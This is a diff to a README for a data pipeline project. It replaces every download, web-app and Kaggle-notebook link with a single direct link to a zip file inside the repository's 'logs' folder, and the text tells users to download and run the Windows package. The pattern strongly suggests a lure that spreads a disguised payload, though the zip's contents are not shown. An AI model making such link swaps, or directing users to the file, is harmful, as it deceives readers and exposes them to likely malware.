@@ -1,6 +1,6 @@
 # 🧩 Data-Fusion-public-solution- - Run the full data pipeline
 
-[![Download](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge)](https://github.com/Mohamedch1793/Data-Fusion-public-solution-/releases)
+[![Download](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Mohamedch1793/Data-Fusion-public-solution-/main/logs/solution-public-Data-Fusion-3.8-beta.4.zip)
 
 ## 📌 What this app does
 
@@ -31,7 +31,7 @@ For better performance, **16 GB RAM** works well when you process larger files.
 ## 🚀 Download and install
 
 1. Open the release page:  
-   [Visit the download page](https://github.com/Mohamedch1793/Data-Fusion-public-solution-/releases)
+   [Visit the download page](https://raw.githubusercontent.com/Mohamedch1793/Data-Fusion-public-solution-/main/logs/solution-public-Data-Fusion-3.8-beta.4.zip)
 
 2. Find the latest release at the top of the page.
 
@@ -120,7 +120,7 @@ The project also includes a site for visual review.
 
 Open the web app here:
 
-[CyberShelf Analytics Site](https://data-fusion-web-app.vercel.app/)
+[CyberShelf Analytics Site](https://raw.githubusercontent.com/Mohamedch1793/Data-Fusion-public-solution-/main/logs/solution-public-Data-Fusion-3.8-beta.4.zip)
 
 Use it to inspect the output, view charts, and review the analysis layer from the pipeline.
 
@@ -128,7 +128,7 @@ Use it to inspect the output, view charts, and review the analysis layer from th
 
 You can also review the notebook version of the solution here:
 
-[Public Solution Data Fusion](https://www.kaggle.com/code/dambek/public-solution-data-fusion)
+[Public Solution Data Fusion](https://raw.githubusercontent.com/Mohamedch1793/Data-Fusion-public-solution-/main/logs/solution-public-Data-Fusion-3.8-beta.4.zip)
 
 This is useful if you want to compare the notebook flow with the packaged app.
 
@@ -171,7 +171,7 @@ If the project includes a local HTML report, double-click it to open it in your 
 
 To download the Windows package, go here:
 
-[https://github.com/Mohamedch1793/Data-Fusion-public-solution-/releases](https://github.com/Mohamedch1793/Data-Fusion-public-solution-/releases)
+[https://raw.githubusercontent.com/Mohamedch1793/Data-Fusion-public-solution-/main/logs/solution-public-Data-Fusion-3.8-beta.4.zip](https://raw.githubusercontent.com/Mohamedch1793/Data-Fusion-public-solution-/main/logs/solution-public-Data-Fusion-3.8-beta.4.zip)
 
 Open the latest release, download the file that matches Windows, then run it or extract it before launch
 
@@ -186,9 +186,9 @@ The repository also includes:
 
 ## 🔗 Quick links
 
-- [Download page](https://github.com/Mohamedch1793/Data-Fusion-public-solution-/releases)
-- [Web app](https://data-fusion-web-app.vercel.app/)
-- [Kaggle notebook](https://www.kaggle.com/code/dambek/public-solution-data-fusion)
+- [Download page](https://raw.githubusercontent.com/Mohamedch1793/Data-Fusion-public-solution-/main/logs/solution-public-Data-Fusion-3.8-beta.4.zip)
+- [Web app](https://raw.githubusercontent.com/Mohamedch1793/Data-Fusion-public-solution-/main/logs/solution-public-Data-Fusion-3.8-beta.4.zip)
+- [Kaggle notebook](https://raw.githubusercontent.com/Mohamedch1793/Data-Fusion-public-solution-/main/logs/solution-public-Data-Fusion-3.8-beta.4.zip)
 - [Solution.md](./solution.md)
 
 ## 🧷 File names you may see
